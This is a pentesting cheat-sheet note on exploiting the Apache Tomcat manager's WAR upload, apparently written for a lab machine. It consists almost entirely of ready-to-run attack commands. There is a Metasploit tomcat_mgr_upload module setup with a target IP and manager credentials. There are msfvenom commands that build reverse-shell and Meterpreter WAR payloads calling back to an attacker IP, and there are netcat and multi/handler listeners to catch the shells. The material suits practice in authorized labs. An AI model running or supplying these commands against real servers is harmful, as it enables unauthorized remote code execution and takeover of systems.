---
tags:
  - Pentesting
  - Exploitation
  - Apache
  - Tomcat
---
- https://www.exploit-db.com/exploits/31433
- https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/
- https://www.revshells.com/

## Metasploit

```
use exploit/multi/http/tomcat_mgr_upload
set RHOST 10.10.10.95
set RPORT 8080
set LHOST 10.10.14.16
set LPORT 4444
set HttpUsername tomcat
set HttpPassword s3cret
options
run
```

## shell.war

**payload**

`msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f war -o shell.war`

**listener**

`nc -lvnp 4444`

## shell.war

**payload**

`msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f war -o shell2.war`

**listener**

`msfconsole -q -x "use multi/handler; set payload java/meterpreter/reverse_tcp; set lhost 10.10.14.16; set lport 4444; exploit"`